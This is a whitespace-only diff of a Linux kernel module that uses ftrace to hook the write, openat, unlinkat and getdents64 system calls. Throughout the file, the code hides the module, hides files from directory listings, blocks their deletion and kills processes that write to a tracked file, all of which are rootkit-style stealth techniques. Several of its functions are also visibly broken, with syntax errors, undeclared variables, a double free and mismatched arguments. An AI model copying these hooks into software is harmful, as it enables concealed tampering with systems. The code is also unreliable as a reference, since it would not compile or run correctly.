@@ -43,8 +43,8 @@ void module_hide(void);
 
 static inline void tidy(void)
 {
-	kfree(THIS_MODULE->sect_attrs);
-	THIS_MODULE->sect_attrs = NULL;
+    kfree(THIS_MODULE->sect_attrs);
+    THIS_MODULE->sect_attrs = NULL;
 }
 
 int fake_open(struct inode * inode, struct file * filp);
@@ -54,10 +54,10 @@ ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,lof
 
 
 static struct file_operations fake_fops = {
-    open:       fake_open,
-    release:    fake_release,
-    read:       fake_read,
-    write:      fake_write,
+open:       fake_open,
+release:    fake_release,
+read:       fake_read,
+write:      fake_write,
 };
 
 
@@ -70,20 +70,20 @@ static unsigned int target_pid = 0;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
 static unsigned long lookup_name(const char *name)
 {
-	struct kprobe kp = {
-		.symbol_name = name
-	};
-	unsigned long retval;
+    struct kprobe kp = {
+        .symbol_name = name
+    };
+    unsigned long retval;
 
-	if (register_kprobe(&kp) < 0) return 0;
-	retval = (unsigned long) kp.addr;
-	unregister_kprobe(&kp);
-	return retval;
+    if (register_kprobe(&kp) < 0) return 0;
+    retval = (unsigned long) kp.addr;
+    unregister_kprobe(&kp);
+    return retval;
 }
 #else
 static unsigned long lookup_name(const char *name)
 {
-	return kallsyms_lookup_name(name);
+    return kallsyms_lookup_name(name);
 }
 #endif
 
@@ -97,7 +97,7 @@ static unsigned long lookup_name(const char *name)
 
 static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
 {
-	return fregs;
+    return fregs;
 }
 #endif
 
@@ -106,43 +106,43 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 
 
 struct ftrace_hook {
-	const char *name;
-	void *function;
-	void *original;
+    const char *name;
+    void *function;
+    void *original;
 
-	unsigned long address;
-	struct ftrace_ops ops;
+    unsigned long address;
+    struct ftrace_ops ops;
 };
 
 static int fh_resolve_hook_address(struct ftrace_hook *hook)
 {
-	hook->address = lookup_name(hook->name);
+    hook->address = lookup_name(hook->name);
 
-	if (!hook->address) {
-		pr_debug("unresolved symbol: %s\n", hook->name);
-		return -ENOENT;
-	}
+    if (!hook->address) {
+        pr_debug("unresolved symbol: %s\n", hook->name);
+        return -ENOENT;
+    }
 
 #if USE_FENTRY_OFFSET
-	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
 #else
-	*((unsigned long*) hook->original) = hook->address;
+    *((unsigned long*) hook->original) = hook->address;
 #endif
 
-	return 0;
+    return 0;
 }
 
 static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
-		struct ftrace_ops *ops, struct ftrace_regs *fregs)
+                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
 {
-	struct pt_regs *regs = ftrace_get_regs(fregs);
-	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
 #if USE_FENTRY_OFFSET
-	regs->ip = (unsigned long)hook->function;
+    regs->ip = (unsigned long)hook->function;
 #else
-	if (!within_module(parent_ip, THIS_MODULE))
-		regs->ip = (unsigned long)hook->function;
+    if (!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long)hook->function;
 #endif
 }
 
@@ -166,18 +166,18 @@ void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
 
 static char *get_filename(const char __user *filename)
 {
-	char *kernel_filename=NULL;
+    char *kernel_filename=NULL;
 
-	kernel_filename = kmalloc(4096, GFP_KERNEL);
-	if (!kernel_filename)
-		return NULL;
+    kernel_filename = kmalloc(4096, GFP_KERNEL);
+    if (!kernel_filename)
+        return NULL;
 
-	if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
-		kfree(kernel_filename);
-		return NULL;
-	}
+    if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
+        kfree(kernel_filename);
+        return NULL;
+    }
 
-	return kernel_filename;
+    return kernel_filename;
 }
 
 
@@ -186,82 +186,82 @@ static asmlinkage long (*real_sys_write)(struct pt_regs *regs);
 
 static asmlinkage long fh_sys_write(struct pt_regs *regs)
 {
-	long ret=0;
-	struct task_struct *task;
-	int signum = 0;
-	struct kernel_siginfo info;
+    long ret=0;
+    struct task_struct *task;
+    int signum = 0;
+    struct kernel_siginfo info;
 
-	signum = SIGKILL;
-	task = current;
+    signum = SIGKILL;
+    task = current;
 
-	if (task->pid == target_pid)
-	{
-		if (regs->di == target_fd)
-		{
-			pr_info("write done by process %d to target file.\n", task->pid);
-			memset(&info, 0, sizeof(struct kernel_siginfo));
-			info.si_signo = signum;
-			ret = send_sig_info(signum, &info, task);
-					if (ret < 0)
-					{
-					  printk(KERN_INFO "error sending signal\n");
-					}
-					else 
-					{
-						printk(KERN_INFO "Target has been killed\n");
-						return 0;
-					}
-		}
-	}
-	ret = real_sys_write(regs);
+    if (task->pid == target_pid)
+    {
+        if (regs->di == target_fd)
+        {
+            pr_info("write done by process %d to target file.\n", task->pid);
+            memset(&info, 0, sizeof(struct kernel_siginfo));
+            info.si_signo = signum;
+            ret = send_sig_info(signum, &info, task);
+            if (ret < 0)
+            {
+                printk(KERN_INFO "error sending signal\n");
+            }
+            else
+            {
+                printk(KERN_INFO "Target has been killed\n");
+                return 0;
+            }
+        }
+    }
+    ret = real_sys_write(regs);
 
-	return ret;
+    return ret;
 }
 #else
 static asmlinkage long (*real_sys_write)(unsigned int fd, const char __user *buf,
-		 size_t count);
+                                         size_t count);
 
 static asmlinkage long fh_sys_write(unsigned int fd, const char __user *buf,
-		 size_t count)
+                                    size_t count)
 {
-	long ret;
-	struct task_struct *taskd;
-	struct kernel_siginfo info;
-	int signum = SIGKILL, ret 0;
-	task = current;
+    long ret;
+    struct task_struct *taskd;
+    struct kernel_siginfo info;
+    int signum = SIGKILL, ret 0;
+    task = current;
 
-	if (task->pid == target_pid)
-	{
-		if (fd == target_fd)
-		{
-			pr_info("write done by process %d to target file.\n", task->pid);
-			memset(&info, 0, sizeof(struct kernel_siginfo));
-			info.si_signo = signum;
-			ret = send_sig_info(signum, &info, task);
-					if (ret < 0)
-					{
-					  printk(KERN_INFO "error sending signal\n");
-					}
-					else 
-					{
-						printk(KERN_INFO "Target has been killed\n");
-						return 0;
-					}
-		}
-	}
-	
-
-	pr_info("Path debug %s\n", buf);
-	char tmp_path=get_filename(buf);
-	if (check_fs_blocklist(tmp_path))
-	{
-		kfree(tmp_path);
-		return NULL;
-	}
-	ret = real_sys_write(fd, buf, count);
+    if (task->pid == target_pid)
+    {
+        if (fd == target_fd)
+        {
+            pr_info("write done by process %d to target file.\n", task->pid);
+            memset(&info, 0, sizeof(struct kernel_siginfo));
+            info.si_signo = signum;
+            ret = send_sig_info(signum, &info, task);
+            if (ret < 0)
+            {
+                printk(KERN_INFO "error sending signal\n");
+            }
+            else
+            {
+                printk(KERN_INFO "Target has been killed\n");
+                return 0;
+            }
+        }
+    }
 
 
-	return ret;
+    pr_info("Path debug %s\n", buf);
+    char tmp_path=get_filename(buf);
+    if (check_fs_blocklist(tmp_path))
+    {
+        kfree(tmp_path);
+        return NULL;
+    }
+    ret = real_sys_write(fd, buf, count);
+
+
+    return ret;
 }
 #endif
 
@@ -271,64 +271,64 @@ static asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
 
 static asmlinkage long fh_sys_openat(struct pt_regs *regs)
 {
-	long ret;
-	char *kernel_filename;
-	struct task_struct *task;
-	task = current;
-	kernel_filename = get_filename((void*) regs->si);
-       //https://elixir.bootlin.com/linux/v4.19-rc2/source/include/linux/kernel.h
+    long ret;
+    char *kernel_filename;
+    struct task_struct *task;
+    task = current;
+    kernel_filename = get_filename((void*) regs->si);
+    //https://elixir.bootlin.com/linux/v4.19-rc2/source/include/linux/kernel.h
 
-	if (check_fs_blocklist(kernel_filename))
-	{
-		pr_info("our file is opened by process with id: %d\n", task->pid);
-		pr_info("opened file : %s\n", kernel_filename);
-		kfree(kernel_filename);
-		ret = real_sys_openat(regs);
-		pr_info("fd returned is %ld\n", ret);
-		target_fd = ret;
-		target_pid = task->pid;
-		return 0;
-		
-	}
+    if (check_fs_blocklist(kernel_filename))
+    {
+        pr_info("our file is opened by process with id: %d\n", task->pid);
+        pr_info("opened file : %s\n", kernel_filename);
+        kfree(kernel_filename);
+        ret = real_sys_openat(regs);
+        pr_info("fd returned is %ld\n", ret);
+        target_fd = ret;
+        target_pid = task->pid;
+        return 0;
 
-	kfree(kernel_filename);
-	ret = real_sys_openat(regs);
+    }
 
-	return ret;
+    kfree(kernel_filename);
+    ret = real_sys_openat(regs);
+
+    return ret;
 }
 #else
 static asmlinkage long (*real_sys_openat)(int dfd, const char __user *filename,
-				int flags, umode_t mode);
+                                          int flags, umode_t mode);
 
 static asmlinkage long fh_sys_openat(int dfd, const char __user *filename,
-				int flags, umode_t mode)
+                                     int flags, umode_t mode)
 {
-	long ret=0;
-	char *kernel_filename;
-	struct task_struct *task;
-	task = current;
+    long ret=0;
+    char *kernel_filename;
+    struct task_struct *task;
+    task = current;
 
-	kernel_filename = get_filename(filename);
+    kernel_filename = get_filename(filename);
 
-	if (check_fs_blocklist(kernel_filename))
-	{
-		pr_info("our file is opened by process with id: %d\n", task->pid);
-		pr_info("blocked opened file : %s\n", filename);
-		kfree(kernel_filename);
-		ret = real_sys_openat(dfd, filename, flags, mode);
-		pr_info("fd returned is %ld\n", ret);
-		target_fd = ret;
-		target_pid = task->pid;
-		ret=0;
-		return ret;
-		
-	}
+    if (check_fs_blocklist(kernel_filename))
+    {
+        pr_info("our file is opened by process with id: %d\n", task->pid);
+        pr_info("blocked opened file : %s\n", filename);
+        kfree(kernel_filename);
+        ret = real_sys_openat(dfd, filename, flags, mode);
+        pr_info("fd returned is %ld\n", ret);
+        target_fd = ret;
+        target_pid = task->pid;
+        ret=0;
+        return ret;
 
-	kfree(kernel_filename);
+    }
 
-	ret = real_sys_openat(filename, flags, mode);
+    kfree(kernel_filename);
 
-	return ret;
+    ret = real_sys_openat(filename, flags, mode);
+
+    return ret;
 }
 #endif
 
@@ -339,49 +339,49 @@ static asmlinkage long (*real_sys_unlinkat) (struct pt_regs *regs);
 
 static asmlinkage long fh_sys_unlinkat (struct pt_regs *regs)
 {
- 	long ret=0;
- 	char *kernel_filename = get_filename((void*) regs->si);
+    long ret=0;
+    char *kernel_filename = get_filename((void*) regs->si);
 
-         if (check_fs_blocklist(kernel_filename))
-	{
+    if (check_fs_blocklist(kernel_filename))
+    {
 
-		pr_info("blocked to not remove file : %s\n", kernel_filename);
-		ret=0;
-		kfree(kernel_filename);
-		return ret;
+        pr_info("blocked to not remove file : %s\n", kernel_filename);
+        ret=0;
+        kfree(kernel_filename);
+        return ret;
 
-	}
+    }
 
-	kfree(kernel_filename);
-	ret = real_sys_unlinkat(regs);
+    kfree(kernel_filename);
+    ret = real_sys_unlinkat(regs);
 
-	return ret;
+    return ret;
 }
 #else
 static asmlinkage long (*real_sys_unlinkat) (int dirfd, const char __user *filename, int flags);
 
 static asmlinkage long fh_sys_unlinkat (int dirfd, const char __user *filename, int flags);
 {
- 	long ret=0;
+    long ret=0;
 
-	char *kernel_filename = get_filename(filename);
+    char *kernel_filename = get_filename(filename);
 
 
-	if (check_fs_blocklist(kernel_filename))
-	{
+    if (check_fs_blocklist(kernel_filename))
+    {
 
-		kfree(kernel_filename);
-		pr_info("blocked to not remove file : %s\n", kernel_filename);
-		ret=0;
-		kfree(kernel_filename);
-		return ret;
+        kfree(kernel_filename);
+        pr_info("blocked to not remove file : %s\n", kernel_filename);
+        ret=0;
+        kfree(kernel_filename);
+        return ret;
 
-	}
+    }
 
-	kfree(kernel_filename);
-	ret = real_sys_unlinkat(dirfd,filename, flags);
+    kfree(kernel_filename);
+    ret = real_sys_unlinkat(dirfd,filename, flags);
 
-	return ret;
+    return ret;
 }
 #endif
 
@@ -410,12 +410,12 @@ static asmlinkage int fh_sys_getdents64(const struct pt_regs *regs)
     {
         current_dir = (void *)dirent_ker + offset;
 
-        if ( check_fs_hidelist(current_dir->d_name)) 
+        if ( check_fs_hidelist(current_dir->d_name))
         {
-    
+
             if( current_dir == dirent_ker )
             {
-      
+
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                 continue;
@@ -449,26 +449,26 @@ done:
 #endif
 
 #define HOOK(_name, _function, _original)	\
-	{					\
-		.name = SYSCALL_NAME(_name),	\
-		.function = (_function),	\
-		.original = (_original),	\
-	}
+{					\
+.name = SYSCALL_NAME(_name),	\
+.function = (_function),	\
+.original = (_original),	\
+}
 
 static struct ftrace_hook demo_hooks[] = {
-	HOOK("sys_write", fh_sys_write, &real_sys_write),
-	HOOK("sys_openat", fh_sys_openat, &real_sys_openat),
-	HOOK("sys_unlinkat", fh_sys_unlinkat, &real_sys_unlinkat),
-	HOOK("sys_getdents64", fh_sys_getdents64, &real_sys_getdents64)
+    HOOK("sys_write", fh_sys_write, &real_sys_write),
+    HOOK("sys_openat", fh_sys_openat, &real_sys_openat),
+    HOOK("sys_unlinkat", fh_sys_unlinkat, &real_sys_unlinkat),
+    HOOK("sys_getdents64", fh_sys_getdents64, &real_sys_getdents64)
 };
 
 
 static int start_hook_resources(void)
 {
-	int err;
-	err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
-	if (err)
-		return err;
-	return 0;
+    int err;
+    err = fh_install_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
+    if (err)
+        return err;
+    return 0;
 }
 
